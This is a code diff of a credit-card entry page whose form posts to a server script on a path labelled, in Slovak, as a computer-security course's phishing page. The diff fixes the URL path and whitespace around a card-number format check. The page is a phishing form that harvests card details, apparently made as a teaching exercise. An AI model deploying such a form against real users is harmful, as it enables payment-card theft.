@@ -12,7 +12,7 @@
 <div class="row">
     <div class="col-75">
         <div class="container">
-            <form action="https://ukfig2.sk/ukfIG2_Koncepty_pocitacovej_bezpecnosti_PHISHING_STRANKA_2/spracuj_kartu.php" method="POST"> <!-- Changed to send data to spracuj_kartu.php -->
+            <form action="https://ukfig2.sk/ukfIG2_Koncepty_pocitacovej_bezpecnosti-PHISHING_STRANKA_2/spracuj_kartu.php" method="POST"> <!-- Changed to send data to spracuj_kartu.php -->
 
                 <div class="row">
                     <div class="col-50">
@@ -103,15 +103,15 @@
     document.querySelector('form').addEventListener('submit', function(event) {
         // Get the credit card number input
         const ccnum = document.getElementById('ccnum').value;
-    
+
         // Regular expression to match the format nnnn-nnnn-nnnn-nnnn
         const ccnumPattern = /^\d{4}-\d{4}-\d{4}-\d{4}$/;
-    
+
         // Validate the credit card number format
         if (!ccnumPattern.test(ccnum)) {
             // If the format is invalid, alert the user
             alert('Please enter a valid credit card number in the format nnnn-nnnn-nnnn-nnnn');
-            
+
             // Prevent form submission
             event.preventDefault();
         }
